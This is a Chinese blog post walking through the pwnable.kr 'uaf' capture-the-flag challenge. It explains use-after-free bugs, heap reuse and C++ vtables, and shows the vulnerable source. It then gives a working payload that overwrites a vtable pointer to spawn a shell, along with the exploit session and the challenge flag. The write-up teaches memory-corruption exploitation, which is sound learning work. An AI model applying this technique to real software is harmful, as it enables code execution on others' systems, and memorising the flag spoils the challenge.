---
id: 78
title: pwnable.kr-uaf
date: 2016-08-18T08:19:54+00:00
author: admin
layout: post
guid: http://www.ikow.cn/?p=78
permalink: /pwnable-kr-uaf/
categories:
  - pwn
tags:
  - c++
  - cpp
  - free
  - payload
  - pwn
  - pwnable.kr
  - uaf
  - use after free
  - vtable
  - 溢出
  - 虚函数
---
题目描述：

> Mommy, what is Use After Free bug?
> 
> ssh uaf@pwnable.kr -p2222 (pw:guest)

根据题目描述我们知道该题考察UAF（use after free)漏洞，关于UAF，简单说下就是内存地址在free后并没有被销毁，下次为相同的结构类型分配大小类似的空间时，之前的内存空间会被重新使用，如果第二次的指针能够被用户所控制，就造成了UAF漏洞。然后有些基础知识（转自：http://blog.csdn.net/qq_20307987/article/details/51511230）：

&nbsp;

1

UAF：引用一段被释放的内存可导致程序崩溃，或处理非预期数值，或执行无干指令。使用被释放的内存可带来诸多不利后果，根据具体实例和缺陷发生时机，轻则导致程序合法数据被破坏，重则可执行任意指令。

2

UAF错误的原因：

(1)导致程序出错和发生异常的各种条件

(2)程序负责释放内存的指令发生混乱

其实简单来说就是因为分配的内存释放后，指针没有因为内存释放而变为NULL，而是继续指向已经释放的内存。攻击者可以利用这个指针对内存进行读写。（这个指针可以称为恶性迷途指针）

3

UAF漏洞的利用：

(1)先搞出来一个迷途指针

(2)精心构造数据填充被释放的内存区域

(3)再次使用该指针，让填充的数据使eip发生跳转。

4

在填充的阶段要考虑系统的内存分配机制,这里介绍一下SLUB

SLUB

对对象类型没有限制，两个对象只要大小差不多就可以重用同一块内存，而不在乎类型是否相同。样的话，同一个笼子既可以放鸡，又可以放鸭。也就是说我们释放掉sock对象A以后马上再创建对象B，只要A和B大小相同（不在乎B的类型），那么B就极有可能重用A的内存。SLAB差不多，只不过要求类型也要相同。

既然B可以为任意对象类型,那我们当然希望选择一个用起来顺手的对象类型。至少要符合以下2个条件：

用户可以控制该对象的大小

用户空间可以对该对象写入数据

如果碰巧这块问题内存新分配的数据是比如C++中的类，那这块内存堆对上可能散落着各种函数指针，只要用shellcode的地址覆盖其中一个函数指针，就能够达成执行任意指令。

&nbsp;

5

malloc函数做了那些事情。

大于512字节的请求，是纯粹的最佳分配，通常取决于FIFO，就是最近使用过的。

小于64字节的请求，这是一个缓存分配器，保持一个快速的再生池块。

在这个两者之间的，对于大的和小的请求的组合，做的最好的是通过尝试，找到满足两个目标的最好的。

对于特别大的字节，大于128KB，如果支持的话，依赖于系统内存映射设备。

&nbsp;

6

虚函数，一旦一个类有虚函数，编译器会为这个类建立一张vtable。子类继承父类vtable中所有项，当子类有同名函数时，修改vtable同名函数地址，改为指向子类的函数地址，子类有新的虚函数时，在vtable中添加。记住，私有函数无法继承，但如果私有函数是虚函数，vtable中会有相应的函数地址，所有子类可以通过手段得到父类的虚私有函数。

&nbsp;

7

vptr每个对象都会有一个，而vptable是每个类有一个

vptr指向vtable

一个类中就算有多个虚函数，也只有一个vptr

做多重继承的时候，继承了多个父类，就会有多个vptr

&nbsp;

8

<p align="left">
  虚函数表的结构：它是一个函数指针表，每一个表项都指向一个函数。任何一个包含至少一个虚函数的类都会有这样一张表。需要注意的是vtable只包含虚函数的指针，没有函数体。实现上是一个函数指针的数组。虚函数表既有继承性又有多态性。每个派生类的vtable继承了它各个基类的vtable，如果基类vtable中包含某一项，则其派生类的vtable中也将包含同样的一项，但是两项的值可能不同。如果派生类覆写(override)了该项对应的虚函数，则派生类vtable的该项指向覆写后的虚函数，没有覆写的话，则沿用基类的值。
</p>

<p align="left">
  每一个类只有唯一的一个vtable，不是每个对象都有一个vtable，恰恰是每个同一个类的对象都有一个指针，这个指针指向该类的vtable（当然，前提是这个类包含虚函数）。那么，每个对象只额外增加了一个指针的大小，一般说来是4字节。
</p>

<p align="left">
  在类对象的内存布局中，首先是该类的vtable指针，然后才是对象数据。
</p>

<p align="left">
  在通过对象指针调用一个虚函数时，编译器生成的代码将先获取对象类的vtable指针，然后调用vtable中对应的项。对于通过对象指针调用的情况，在编译期间无法确定指针指向的是基类对象还是派生类对象，或者是哪个派生类的对象。但是在运行期间执行到调用语句时，这一点已经确定，编译后的调用代码能够根据具体对象获取正确的vtable，调用正确的虚函数，从而实现多态性。
</p>

我们看下uaf.cpp的代码：

<pre class="brush: cpp; title: ; notranslate" title="">#include &lt;fcntl.h&gt;
#include &lt;iostream&gt; 
#include &lt;cstring&gt;
#include &lt;cstdlib&gt;
#include &lt;unistd.h&gt;
using namespace std;

class Human{
private:
 virtual void give_shell(){
 system("/bin/sh");
 }
protected:
 int age;
 string name;
public:
 virtual void introduce(){
 cout &lt;&lt; "My name is " &lt;&lt; name &lt;&lt; endl;
 cout &lt;&lt; "I am " &lt;&lt; age &lt;&lt; " years old" &lt;&lt; endl;
 }
};

class Man: public Human{
public:
 Man(string name, int age){
 this-&gt;name = name;
 this-&gt;age = age;
 }
 virtual void introduce(){
 Human::introduce();
 cout &lt;&lt; "I am a nice guy!" &lt;&lt; endl;
 }
};

class Woman: public Human{
public:
 Woman(string name, int age){
 this-&gt;name = name;
 this-&gt;age = age;
 }
 virtual void introduce(){
 Human::introduce();
 cout &lt;&lt; "I am a cute girl!" &lt;&lt; endl;
 }
};

int main(int argc, char* argv[]){
 Human* m = new Man("Jack", 25);
 Human* w = new Woman("Jill", 21);

 size_t len;
 char* data;
 unsigned int op;
 while(1){
 cout &lt;&lt; "1. use\n2. after\n3. free\n";
 cin &gt;&gt; op;

 switch(op){
 case 1:
 m-&gt;introduce();
 w-&gt;introduce();
 break;
 case 2:
 len = atoi(argv[1]);
 data = new char[len];
 read(open(argv[2], O_RDONLY), data, len);
 cout &lt;&lt; "your data is allocated" &lt;&lt; endl;
 break;
 case 3:
 delete m;
 delete w;
 break;
 default:
 break;
 }
 }

 return 0; 
}
</pre>

这里我们看到有一个父类 human，两个子类man和woman，human中有两个虚函数，giv\_shell 和 introduce，根据前面的基础知识，这里的虚函数都存在vtable中，只不过man和woman中的introduce都分别自己实现了，所以子类中introduce的地址不同，但是give\_shell的地址都与父类的地址相同。在main函数中，我们看到分别new了man和woman两个对象，在IDA中我们可以看到新的对象的大小都是24个字节，我们可以看下这篇文章：http://www.cnblogs.com/bizhu/archive/2012/09/25/2701691.html， 类的对象所占内存空间大小其实和成员变量的大小是相同的，因为man和woman的成员变量相同，所以他们所占的内存空间都是相同的，这里为我们UAF创造了条件。

我们看下main三个分支的流程：

程序流程是根据输入数字跳转到不同的地方执行

1 调用两个类的函数

2 分配data空间，注意用的时New，从文件名为argv[2]中读取长度为argv[1]的字符到data部分。

3 释放对象

这里如果我们释放对象，然后再去调用，这里会把指针置空然后又引用了，导致这里的指针可以被我们控制，这里arv[]的内容也是通过我们的输入而控制的。所以这里利用的思路就是，先向文件中写入give_shell的地址，然后控制指针指向那个地址即可。

那么如何控制指针呢？前面我们提到了vtable，我们从vtable中获取give\_shell的地址替换introduce的地址，然后我们再执行1时，实际执行的是give\_shell，因为ssh连接后当前目录不可写，我们在/tmp/下新建文件uafpoc，文件内容为vtable地址-8，因为在调用的时候指针会指向eax+8，所以IDA中我们看到vtable的地址为：0x401570，所以最终我们的payload为：

> uaf@ubuntu:~$ python -c &#8220;print &#8216;\x68\x15\x40\x00\x00\x00\x00\x00&#8242;&#8221; > /tmp/uafpoc
  
> uaf@ubuntu:~$ ./uaf 24 &#8220;/tmp/uafpoc&#8221;
  
> 1. use
  
> 2. after
  
> 3. free
  
> 3
  
> 1. use
  
> 2. after
  
> 3. free
  
> 2
  
> your data is allocated
  
> 1. use
  
> 2. after
  
> 3. free
  
> 2
  
> your data is allocated
  
> 1. use
  
> 2. after
  
> 3. free
  
> 1
  
> $ cat flag
  
> yay\_f1ag\_aft3r_pwning

这里需要注意下free的顺序是先free的m，后free的w，因此在分配内存的时候优先分配到后释放的w,因此需要先申请一次空间，将w分配出去，再开一次，就能分配到m了

最终的flag为：

yay\_f1ag\_aft3r_pwning